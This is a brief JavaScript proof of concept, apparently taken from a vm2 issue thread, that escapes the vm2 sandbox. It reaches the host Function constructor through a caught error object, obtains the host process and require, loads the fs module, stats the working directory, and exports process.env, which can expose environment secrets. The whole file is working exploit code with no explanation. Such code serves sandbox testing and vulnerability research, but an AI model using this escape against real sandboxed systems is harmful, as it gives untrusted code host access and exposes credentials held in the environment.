// https://github.com/patriksimek/vm2/issues/32#issuecomment-226693569


function exploit(o) {
    const foreignFunction = o.constructor.constructor;
    const process = foreignFunction('return process')();
    const require = process.mainModule.require;
    //const console = require('console');
    const fs = require('fs');

    console.log(fs.statSync('.'));

    return o;
}

try {
    new Buffer();
}
catch (e) {
    exploit(e);
}
module.exports = process.env;
